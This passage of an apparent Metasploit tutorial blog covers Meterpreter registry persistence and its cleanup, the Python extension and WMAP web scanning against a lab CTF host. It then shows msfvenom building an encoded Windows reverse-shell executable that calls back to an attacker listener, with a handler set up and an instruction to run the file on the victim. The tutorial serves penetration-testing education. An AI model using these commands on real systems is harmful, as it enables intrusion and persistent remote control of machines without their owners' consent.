</span><span class='line'>[*] Executing script C:\Users\wingoat\AppData\Local\Temp\PxRekDybzCP.vbs
</span><span class='line'>[+] Agent executed with PID 2720
</span><span class='line'>[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\VNYLJOXnjCVb
</span><span class='line'>[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\VNYLJOXnjCVb
</span><span class='line'>meterpreter &gt; 
</span><span class='line'>[*] Sending stage (957487 bytes) to 192.168.80.128
</span><span class='line'>[*] Meterpreter session 4 opened (192.168.80.155:5555 -&gt; 192.168.80.128:49172) at 2016-06-10 13:54:36 -0400</span></code></pre></td></tr></table></div></figure>


<p>When done, don&rsquo;t forget the cleanup:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; resource /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.0141/WIN-D7GA2J1M0TU_20160610.0141.rc
</span><span class='line'>[*] Reading /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.0141/WIN-D7GA2J1M0TU_20160610.0141.rc
</span><span class='line'>[*] Running rm C://Users//wingoat//AppData//Local//Temp//cIABjXRUXdyyr.vbs
</span><span class='line'>
</span><span class='line'>[*] Running reg deleteval -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' -v IbLYzVxLgKX
</span><span class='line'>
</span><span class='line'>Successfully deleted IbLYzVxLgKX.</span></code></pre></td></tr></table></div></figure>


<h2>Python extensions</h2>

<p>For us Python coders out there, Meterpreter has a nice Python extension that can allow us to run Python code without it being installed on the target machine</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; load python
</span><span class='line'>Loading extension python...success.
</span><span class='line'>meterpreter &gt; help
</span><span class='line'>...
</span><span class='line'>Python Commands
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>    Command         Description
</span><span class='line'>    -------         -----------
</span><span class='line'>    python_execute  Execute a python command string
</span><span class='line'>    python_import   Import/run a python file or module
</span><span class='line'>    python_reset    Resets/restarts the Python interpreter</span></code></pre></td></tr></table></div></figure>


<h1>Vulnerability scanning</h1>

<p>For web application assessments, Metasploit has a built-in web app scanner called WMAP:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; load wmap
</span><span class='line'>
</span><span class='line'>.-.-.-..-.-.-..---..---.
</span><span class='line'>| | | || | | || | || |-'
</span><span class='line'>`-----'`-'-'-'`-^-'`-'
</span><span class='line'>[WMAP 1.5.1] ===  et [  ] metasploit.com 2012
</span><span class='line'>[*] Successfully loaded plugin: wmap
</span><span class='line'>msf &gt; help
</span><span class='line'>
</span><span class='line'>wmap Commands
</span><span class='line'>=============
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    wmap_modules  Manage wmap modules
</span><span class='line'>    wmap_nodes    Manage nodes
</span><span class='line'>    wmap_run      Test targets
</span><span class='line'>    wmap_sites    Manage sites
</span><span class='line'>    wmap_targets  Manage targets
</span><span class='line'>    wmap_vulns    Display web vulns
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>First you have to add a site:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_sites -h
</span><span class='line'>[*] Usage: wmap_sites [options]
</span><span class='line'>  -h        Display this help text
</span><span class='line'>  -a [url]  Add site (vhost,url)
</span><span class='line'>  -d [ids]  Delete sites (separate ids with space)
</span><span class='line'>  -l        List all available sites
</span><span class='line'>  -s [id]   Display site structure (vhost,url|ids) (level)
</span><span class='line'>msf &gt; wmap_sites -a http://192.168.80.157/
</span><span class='line'>[*] Site created.
</span></code></pre></td></tr></table></div></figure>


<p>Then you specify the added site as a target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_targets -h
</span><span class='line'>[*] Usage: wmap_targets [options]
</span><span class='line'>  -h      Display this help text
</span><span class='line'>  -t [urls]   Define target sites (vhost1,url[space]vhost2,url) 
</span><span class='line'>  -d [ids]    Define target sites (id1, id2, id3 ...)
</span><span class='line'>  -c      Clean target sites list
</span><span class='line'>  -l          List all target sites
</span><span class='line'>msf &gt; wmap_targets -t http://192.168.80.157/</span></code></pre></td></tr></table></div></figure>


<p>Before scanning you might want to take a look at the enabled modules:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_modules -h
</span><span class='line'>[*] Usage: wmap_modules [options]
</span><span class='line'>  -h      Display this help text
</span><span class='line'>  -l          List all wmap enabled modules
</span><span class='line'>  -r      Reload wmap modules
</span><span class='line'>
</span><span class='line'>msf &gt; wmap_modules -l
</span><span class='line'>[*] Loading wmap modules...
</span><span class='line'>[*] 40 wmap enabled modules loaded.
</span><span class='line'>[*] wmap_ssl
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>     Name                         OrderID
</span><span class='line'>     ----                         -------
</span><span class='line'>     auxiliary/scanner/http/cert  :last
</span><span class='line'>     auxiliary/scanner/http/ssl   :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_server
</span><span class='line'>===========
</span><span class='line'>
</span><span class='line'>     Name                                           OrderID
</span><span class='line'>     ----                                           -------
</span><span class='line'>     auxiliary/admin/http/tomcat_administration     :last
</span><span class='line'>     auxiliary/admin/http/tomcat_utf8_traversal     :last
</span><span class='line'>     auxiliary/scanner/http/drupal_views_user_enum  :last
</span><span class='line'>     auxiliary/scanner/http/frontpage_login         :last
</span><span class='line'>     auxiliary/scanner/http/host_header_injection   :last
</span><span class='line'>     auxiliary/scanner/http/http_version            0
</span><span class='line'>     auxiliary/scanner/http/open_proxy              1
</span><span class='line'>     auxiliary/scanner/http/options                 :last
</span><span class='line'>     auxiliary/scanner/http/robots_txt              :last
</span><span class='line'>     auxiliary/scanner/http/scraper                 :last
</span><span class='line'>     auxiliary/scanner/http/svn_scanner             :last
</span><span class='line'>     auxiliary/scanner/http/trace                   :last
</span><span class='line'>     auxiliary/scanner/http/vhost_scanner           :last
</span><span class='line'>     auxiliary/scanner/http/webdav_internal_ip      :last
</span><span class='line'>     auxiliary/scanner/http/webdav_scanner          :last
</span><span class='line'>     auxiliary/scanner/http/webdav_website_content  :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_dir
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>     Name                                                   OrderID
</span><span class='line'>     ----                                                   -------
</span><span class='line'>     auxiliary/scanner/http/brute_dirs                      :last
</span><span class='line'>     auxiliary/scanner/http/dir_listing                     :last
</span><span class='line'>     auxiliary/scanner/http/dir_scanner                     :last
</span><span class='line'>     auxiliary/scanner/http/dir_webdav_unicode_bypass       :last
</span><span class='line'>     auxiliary/scanner/http/file_same_name_dir              :last
</span><span class='line'>     auxiliary/scanner/http/files_dir                       :last
</span><span class='line'>     auxiliary/scanner/http/http_put                        :last
</span><span class='line'>     auxiliary/scanner/http/ms09_020_webdav_unicode_bypass  :last
</span><span class='line'>     auxiliary/scanner/http/prev_dir_same_name_file         :last
</span><span class='line'>     auxiliary/scanner/http/soap_xml                        :last
</span><span class='line'>     auxiliary/scanner/http/trace_axd                       :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_file
</span><span class='line'>=========
</span><span class='line'>
</span><span class='line'>     Name                                     OrderID
</span><span class='line'>     ----                                     -------
</span><span class='line'>     auxiliary/dos/http/apache_range_dos      :last
</span><span class='line'>     auxiliary/scanner/http/backup_file       :last
</span><span class='line'>     auxiliary/scanner/http/copy_of_file      :last
</span><span class='line'>     auxiliary/scanner/http/replace_ext       :last
</span><span class='line'>     auxiliary/scanner/http/verb_auth_bypass  :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_unique_query
</span><span class='line'>=================
</span><span class='line'>
</span><span class='line'>     Name                                          OrderID
</span><span class='line'>     ----                                          -------
</span><span class='line'>     auxiliary/scanner/http/blind_sql_query        :last
</span><span class='line'>     auxiliary/scanner/http/error_sql_injection    :last
</span><span class='line'>     auxiliary/scanner/http/http_traversal         :last
</span><span class='line'>     auxiliary/scanner/http/rails_mass_assignment  :last
</span><span class='line'>     exploit/multi/http/lcms_php_exec              :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_query
</span><span class='line'>==========
</span><span class='line'>
</span><span class='line'>     Name  OrderID
</span><span class='line'>     ----  -------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_generic
</span><span class='line'>============
</span><span class='line'>
</span><span class='line'>     Name  OrderID
</span><span class='line'>     ----  -------</span></code></pre></td></tr></table></div></figure>


<p>And finally, you can see which modules are enabled for your target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_run -h
</span><span class='line'>[*] Usage: wmap_run [options]
</span><span class='line'>  -h                        Display this help text
</span><span class='line'>  -t                        Show all enabled modules
</span><span class='line'>  -m [regex]                Launch only modules that name match provided regex.
</span><span class='line'>  -p [regex]                Only test path defined by regex.
</span><span class='line'>  -e [/path/to/profile]     Launch profile modules against all matched targets.
</span><span class='line'>                            (No profile file runs all enabled modules.)
</span><span class='line'>msf &gt; wmap_run -t
</span><span class='line'>[*] Testing target:
</span><span class='line'>[*]   Site: 192.168.80.157 (192.168.80.157)
</span><span class='line'>[*]   Port: 80 SSL: false
</span><span class='line'>============================================================
</span><span class='line'>[*] Testing started. 2016-06-07 13:37:11 -0400
</span><span class='line'>[*] 
</span><span class='line'>=[ SSL testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Target is not SSL. SSL modules disabled.
</span><span class='line'>[*] 
</span><span class='line'>=[ Web Server testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Module auxiliary/scanner/http/http_version
</span><span class='line'>[*] Module auxiliary/scanner/http/open_proxy
</span><span class='line'>[*] Module auxiliary/scanner/http/robots_txt
</span><span class='line'>[*] Module auxiliary/scanner/http/frontpage_login
</span><span class='line'>[*] Module auxiliary/scanner/http/host_header_injection
</span><span class='line'>[*] Module auxiliary/admin/http/tomcat_administration
</span><span class='line'>[*] Module auxiliary/admin/http/tomcat_utf8_traversal
</span><span class='line'>[*] Module auxiliary/scanner/http/options
</span><span class='line'>[*] Module auxiliary/scanner/http/drupal_views_user_enum
</span><span class='line'>[*] Module auxiliary/scanner/http/scraper
</span><span class='line'>[*] Module auxiliary/scanner/http/svn_scanner
</span><span class='line'>[*] Module auxiliary/scanner/http/trace
</span><span class='line'>[*] Module auxiliary/scanner/http/vhost_scanner
</span><span class='line'>[*] Module auxiliary/scanner/http/webdav_internal_ip
</span><span class='line'>[*] Module auxiliary/scanner/http/webdav_scanner
</span><span class='line'>[*] Module auxiliary/scanner/http/webdav_website_content
</span><span class='line'>[*] 
</span><span class='line'>=[ File/Dir testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Module auxiliary/dos/http/apache_range_dos
</span><span class='line'>[*] Module auxiliary/scanner/http/backup_file
</span><span class='line'>[*] Module auxiliary/scanner/http/brute_dirs
</span><span class='line'>[*] Module auxiliary/scanner/http/copy_of_file
</span><span class='line'>[*] Module auxiliary/scanner/http/dir_listing
</span><span class='line'>[*] Module auxiliary/scanner/http/dir_scanner
</span><span class='line'>[*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass
</span><span class='line'>[*] Module auxiliary/scanner/http/file_same_name_dir
</span><span class='line'>[*] Module auxiliary/scanner/http/files_dir
</span><span class='line'>[*] Module auxiliary/scanner/http/http_put
</span><span class='line'>[*] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
</span><span class='line'>[*] Module auxiliary/scanner/http/prev_dir_same_name_file
</span><span class='line'>[*] Module auxiliary/scanner/http/replace_ext
</span><span class='line'>[*] Module auxiliary/scanner/http/soap_xml
</span><span class='line'>[*] Module auxiliary/scanner/http/trace_axd
</span><span class='line'>[*] Module auxiliary/scanner/http/verb_auth_bypass
</span><span class='line'>[*] 
</span><span class='line'>=[ Unique Query testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Module auxiliary/scanner/http/blind_sql_query
</span><span class='line'>[*] Module auxiliary/scanner/http/error_sql_injection
</span><span class='line'>[*] Module auxiliary/scanner/http/http_traversal
</span><span class='line'>[*] Module auxiliary/scanner/http/rails_mass_assignment
</span><span class='line'>[*] Module exploit/multi/http/lcms_php_exec
</span><span class='line'>[*] 
</span><span class='line'>=[ Query testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] 
</span><span class='line'>=[ General testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Done.</span></code></pre></td></tr></table></div></figure>


<p>I started the scan with <code>wmap_run -e</code> (not showing the output due to size). After it finished, I checked if any interesting vulnerabilities were uncovered:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_vulns -l
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): scraper /
</span><span class='line'>[*]   scraper Scraper
</span><span class='line'>[*]   GET CTF 6 - Widgets Inc.
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): directory /docs/
</span><span class='line'>[*]   directory Directoy found.
</span><span class='line'>[*]   GET Res code: 200
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): directory /js/
</span><span class='line'>[*]   directory Directoy found.
</span><span class='line'>[*]   GET Res code: 200
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): directory /lib/
</span><span class='line'>[*]   directory Directoy found.
</span><span class='line'>[*]   GET Res code: 200
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): directory /logs/
</span><span class='line'>[*]   directory Directoy found.
</span><span class='line'>[*]   GET Res code: 401
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Only a bunch of directories discovered but you don&rsquo;t know what you can find without looking.</p>

<h1>Generating executables</h1>

<p>With Msfvenom, you can not only generate shellcode, but also create executables from whichever payload you want to use.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#msfvenom -h
</span><span class='line'>Options:
</span><span class='line'>    -p, --payload       &lt;payload&gt;    Payload to use. Specify a '-' or stdin to use custom payloads
</span><span class='line'>        --payload-options            List the payload's standard options
</span><span class='line'>    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
</span><span class='line'>    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload
</span><span class='line'>    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list)
</span><span class='line'>        --help-formats               List available formats
</span><span class='line'>    -e, --encoder       &lt;encoder&gt;    The encoder to use
</span><span class='line'>    -a, --arch          &lt;arch&gt;       The architecture to use
</span><span class='line'>        --platform      &lt;platform&gt;   The platform of the payload
</span><span class='line'>        --help-platforms             List available platforms
</span><span class='line'>    -s, --space         &lt;length&gt;     The maximum size of the resulting payload
</span><span class='line'>        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value)
</span><span class='line'>    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: '\x00\xff'
</span><span class='line'>    -i, --iterations    &lt;count&gt;      The number of times to encode the payload
</span><span class='line'>    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include
</span><span class='line'>    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template
</span><span class='line'>    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
</span><span class='line'>    -o, --out           &lt;path&gt;       Save the payload
</span><span class='line'>    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats
</span><span class='line'>        --smallest                   Generate the smallest possible payload
</span><span class='line'>    -h, --help                       Show this message</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s say we want to use a reverse shell executable. First, let&rsquo;s look at the payload options:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#msfvenom --payload-options -p windows/x64/shell/reverse_tcp
</span><span class='line'>Ignoring bcrypt-3.1.10 because its extensions are not built.  Try: gem pristine bcrypt --version 3.1.10
</span><span class='line'>Options for payload/windows/x64/shell/reverse_tcp:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       Name: Windows x64 Command Shell, Windows x64 Reverse TCP Stager
</span><span class='line'>     Module: payload/windows/x64/shell/reverse_tcp
</span><span class='line'>   Platform: Windows
</span><span class='line'>       Arch: x86_64
</span><span class='line'>Needs Admin: No
</span><span class='line'> Total size: 449
</span><span class='line'>       Rank: Normal
</span><span class='line'>
</span><span class='line'>Provided by:
</span><span class='line'>    sf &lt;stephen_fewer@harmonysecurity.com&gt;
</span><span class='line'>
</span><span class='line'>Basic options:
</span><span class='line'>Name      Current Setting  Required  Description
</span><span class='line'>----      ---------------  --------  -----------
</span><span class='line'>EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>LPORT     4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>Description:
</span><span class='line'>  Spawn a piped command shell (Windows x64) (staged). Connect back to 
</span><span class='line'>  the attacker (Windows x64)
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Now we know what options we need for creating an executable. I already have the LHOST and LPORT set, but will pass them anyway for demo purposes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.80.155 LPORT=4444 -b "\x00" -e x64/xor -f exe -o ~/doom.exe
</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span><span class='line'>No Arch selected, selecting Arch: x86_64 from the payload
</span><span class='line'>Found 1 compatible encoders
</span><span class='line'>Attempting to encode payload with 1 iterations of x64/xor
</span><span class='line'>x64/xor succeeded with size 551 (iteration=0)
</span><span class='line'>x64/xor chosen with final size 551
</span><span class='line'>Payload size: 551 bytes
</span><span class='line'>Saved as: /root/doom.exe</span></code></pre></td></tr></table></div></figure>


<p>Inside Metasploit, we have to launch the generic payload handler. <a href="https://www.rapid7.com/db/modules/exploit/multi/handler">This module is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework.</a>. Don&rsquo;t forget to set the options and the payload to match the one you put in the executable:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/handler
</span><span class='line'>msf exploit(handler) &gt; set payload windows/x64/shell/reverse_tcp
</span><span class='line'>payload =&gt; windows/x64/shell/reverse_tcp
</span><span class='line'>msf exploit(handler) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/handler):
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (windows/x64/shell/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>   LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>   LPORT     4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Wildcard Target</span></code></pre></td></tr></table></div></figure>


<p>Now run the exploit on your machine. All you need to do now is to transfer your executable to the victim machine and run it there to receive your shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
